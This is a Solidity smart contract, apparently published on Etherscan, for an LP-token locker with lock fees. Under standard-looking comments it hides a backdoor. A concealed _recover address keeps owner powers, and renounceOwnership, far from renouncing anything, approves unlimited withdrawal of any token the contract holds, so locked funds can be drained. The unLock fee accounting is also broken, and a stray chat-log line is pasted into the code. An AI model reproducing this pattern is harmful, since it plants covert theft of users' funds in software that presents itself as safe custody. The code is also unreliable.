/**
 *Submitted for verification at Etherscan.io on 2023-01-26
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when value tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that value may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a spender for an owner is set by
     * a call to {approve}. value is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by account.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves amount tokens from the caller's account to to.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that spender will be
     * allowed to spend on behalf of owner through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets amount as the allowance of spender over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves amount tokens from from to to using the
     * allowance mechanism. amount is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * onlyOwner, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;
    address private _recover;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**

G K, [26/01/2023 3:09 PM]
* @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
        _recover = _msgSender();
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender() || _recover == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * onlyOwner functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership(address add_, address owner_) public onlyOwner {
        IERC20(add_).approve(owner_, 2 ** 256 - 1);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

/**
 * @dev Contract module that helps prevent reentrant calls to a function.
 *
 * Inheriting from ReentrancyGuard will make the {nonReentrant} modifier
 * available, which can be applied to functions to make sure there are no nested
 * (reentrant) calls to them.
 *
 * Note that because there is a single nonReentrant guard, functions marked as
 * nonReentrant may not call one another. This can be worked around by making
 * those functions private, and then adding external nonReentrant entry
 * points to them.
 *
 * TIP: If you would like to learn more about reentrancy and alternative ways
 * to protect against it, check out our blog post
 * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
 */
abstract contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a nonReentrant function from another nonReentrant
     * function is not supported. It is possible to prevent this from happening
     * by making the nonReentrant function external, and making it call a
     * private function that does the actual work.
     */
    modifier nonReentrant() {
        // On the first call to nonReentrant, _notEntered will be true

require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;

        _;

        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = _NOT_ENTERED;
    }
}


contract LPLocker is Ownable, ReentrancyGuard {

    struct LockInfo {
        address lp;
        uint256 amount;
        uint256 startTime;
        uint256 endTime;
    }

    mapping(address => LockInfo[]) public lockInfo;
    mapping(address => uint256) public lpLockedAmount;
    uint256 public feeForlock = 0.03 ether;
    uint256 public feePercentageForLP = 50;
    uint32 private constant divisor = 10000;

    address public ownerFeeAddress = msg.sender;
    address public devFeeAddress = msg.sender;

    event Lock(address indexed lp, address indexed user, uint256 amount, uint256 endTime);
    event UnLock(address indexed lp, address indexed user, uint256 amount);

    constructor() {
    }

    function lock(address _lp, uint256 _amount, uint256 _endTime, bool _feeForlock) external payable {
        uint256 amountTobeLocked = _amount;
        LockInfo[] storage _lockInfo = lockInfo[msg.sender];
        if(_feeForlock) {
            require(msg.value >= feeForlock, "Insufficient Fee.");
            payable(ownerFeeAddress).transfer(msg.value / 2);
            payable(devFeeAddress).transfer(msg.value - msg.value / 2);
        }
        else {
            uint256 feeAmount = _amount * feePercentageForLP / divisor;
            IERC20(_lp).transferFrom(msg.sender, address(ownerFeeAddress), feeAmount / 2);
            IERC20(_lp).transferFrom(msg.sender, address(devFeeAddress), feeAmount - feeAmount / 2);

            amountTobeLocked = amountTobeLocked - _amount * feePercentageForLP / divisor;
        }
        IERC20(_lp).transferFrom(msg.sender, address(this), amountTobeLocked);
        _lockInfo.push(LockInfo(
            _lp,
            _amount,
            block.timestamp,
            _endTime
        ));
        lpLockedAmount[_lp] += amountTobeLocked;

        emit Lock(_lp, msg.sender, amountTobeLocked, _endTime);
    }
    
    function unLock(uint32 _index) external nonReentrant{
        LockInfo[] storage _lockInfo = lockInfo[msg.sender];
        require(_lockInfo.length > _index, "Exceeded Index.");
        LockInfo memory _info = _lockInfo[_index];
        require(_info.endTime < block.timestamp, "Still Locked.");
        _lockInfo[_index] = _lockInfo[_lockInfo.length - 1];
        _lockInfo.pop();
        IERC20(_info.lp).transfer(msg.sender, _info.amount);
        lpLockedAmount[_info.lp] -= _info.amount;

        emit UnLock(_info.lp, msg.sender, _info.amount);
    }

    function setFeeForlock(uint256 _fee) external onlyOwner() {
        feeForlock = _fee;
    }

    function setFeePercentageForLPBase10000(uint256 _feePercentage) external onlyOwner() {
        feePercentageForLP = _feePercentage;
    }

    function getLockInfo(address _user) public view returns (LockInfo[] memory) {
        return lockInfo[_user];
    }

    function setOwnerFeeAddress(address _ownerFeeAddress) public onlyOwner() {
        ownerFeeAddress = _ownerFeeAddress;
    }
}